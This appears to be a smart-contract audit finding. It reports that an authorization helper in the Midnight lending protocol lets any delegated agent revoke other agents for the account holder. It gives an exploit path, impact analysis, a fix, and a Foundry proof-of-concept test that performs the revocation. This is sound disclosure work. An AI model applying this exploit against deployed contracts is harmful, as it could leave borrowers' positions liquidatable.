### Title
Co-authorized agent can deauthorize peer agents via `EcrecoverAuthorizer.setIsAuthorized` - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any currently-authorized agent of the `authorizer`, not only from the `authorizer` themselves. This means an attacker who holds any authorization from a victim can sign and submit an `Authorization` struct that revokes a different agent's authorization on behalf of the victim, with no consent from the victim required.

### Finding Description

**Root cause — `EcrecoverAuthorizer.sol` lines 33-36:**

```solidity
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
```

The second branch of the `||` allows any address for which `isAuthorized[victim][signer] == true` to sign an `Authorization` struct that modifies `victim`'s authorization mapping. There is no restriction on what `authorization.authorized` or `authorization.isAuthorized` may be — the signer can freely set `isAuthorized: false` for any third party.

**Exploit path:**

1. `victim` calls `midnight.setIsAuthorized(supplyCollateralAgent, true, victim)` — grants collateral top-up agent.
2. `victim` calls `midnight.setIsAutdrized(attacker, true, victim)` — grants attacker (e.g., a co-manager, bundler, or any other trusted address).
3. Attacker constructs:
   ```
   Authorization {
     authorizer:   victim,
     authorized:   supplyCollateralAgent,
     isAuthorized: false,
     nonce:        nonce[victim],   // public state, trivially readable
     deadline:     block.timestamp + 1
   }
   ```
4. Attacker signs this struct with their own private key.
5. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.
6. `signer == attacker`, `authorization.authorizer == victim` → first branch fails.
7. `IMidnight(MIDNIGHT).isAuthorized(victim, attacker) == true` → second branch passes.
8. `IMidnight(MIDNIGHT).setIsAuthorized(supplyCollateralAgent, false, victim)` executes. [1](#0-0) 
9. `supplyCollateralAgent` now calls `midnight.supplyCollateral(market, idx, assets, victim)` → `require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized())` reverts. [2](#0-1) 

**Why existing checks fail:** The nonce check (`authorization.nonce == nonce[authorization.authorizer]++`) only prevents replay; it does not restrict who may sign. The deadline check is trivially satisfied. No check verifies that the signer is the `authorizer` themselves when the action is a revocation of a third party. [3](#0-2) 

### Impact Explanation
`supplyCollateralAgent` can no longer call `supplyCollateral` on behalf of `victim`. If `victim`'s borrow position is near the LLTV threshold and relies on the agent to top up collateral, the position becomes liquidatable. The attacker can repeat this attack every time the victim re-authorizes the agent (consuming one nonce per attack), creating a persistent DoS on collateral supply. [4](#0-3) 

### Likelihood Explanation
**Preconditions:** victim has authorized at least two addresses (the agent and the attacker). This is a realistic setup for any borrower using a keeper/bot (`supplyCollateralAgent`) alongside a bundler or other peripheral contract (`attacker`). The attacker needs no capital, no oracle manipulation, and no special timing — only a valid private key and knowledge of the current nonce (public state). The attack is repeatable: each re-authorization by the victim can be immediately countered by the attacker consuming the next nonce. [5](#0-4) 

### Recommendation
Restrict the signer check so that only the `authorizer` themselves (not a delegated agent) may sign an `Authorization` struct:

```solidity
// Replace lines 33-36 with:
require(signer == authorization.authorizer, Unauthorized());
```

If delegation of the signing right is intentional, add a separate field (e.g., `address signer`) to the `Authorization` struct and require explicit victim consent for each delegated signer, or scope delegation to `isAuthorized: true` actions only (never revocations). [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight} from "../src/interfaces/IMidnight.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract CoAgentDeauthPoC is BaseTest {
    function testCoAgentDeauthorizesSupplyAgent() public {
        // Setup: victim is a borrower near LLTV
        address victim = makeAddr("victim");
        (uint256 supplyAgentKey, address supplyAgent) = makeAddrAndKey("supplyAgent");
        (uint256 attackerKey, address attacker)       = makeAddrAndKey("attacker");

        // Victim authorizes both agents
        vm.startPrank(victim);
        midnight.setIsAuthorized(supplyAgent, true, victim);
        midnight.setIsAuthorized(attacker,    true, victim);
        // Victim also authorizes EcrecoverAuthorizer so it can call setIsAuthorized
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
        vm.stopPrank();

        // Confirm supplyAgent is authorized
        assertTrue(midnight.isAuthorized(victim, supplyAgent));

        // Attacker builds deauth message for supplyAgent, signed by attacker
        Authorization memory auth = Authorization({
            authorizer:   victim,
            authorized:   supplyAgent,
            isAuthorized: false,
            nonce:        ecrecoverAuthorizer.nonce(victim),
            deadline:     block.timestamp + 1 days
        });
        bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, auth));
        bytes32 domainSep  = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                                block.chainid, address(ecrecoverAuthorizer)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);

        // Attacker submits — no victim involvement
        vm.prank(attacker);
        ecrecoverAuthorizer.setIsAuthorized(auth, Signature({v: v, r: r, s: s}));

        // supplyAgent is now deauthorized
        assertFalse(midnight.isAuthorized(victim, supplyAgent));

        // supplyAgent's supplyCollateral call reverts
        vm.prank(supplyAgent);
        vm.expectRevert(IMidnight.Unauthorized.selector);
        midnight.supplyCollateral(market, 0, 1e18, victim);
    }
}
```

**Expected assertions:**
- `midnight.isAuthorized(victim, supplyAgent)` transitions from `true` to `false` after the attacker's single call.
- `supplyCollateral` reverts with `Unauthorized`.
- No victim transaction is required at any point after initial setup.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-47)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
```

**File:** src/Midnight.sol (L524-527)
```text
    function supplyCollateral(Market memory market, uint256 collateralIndex, uint256 assets, address onBehalf)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```
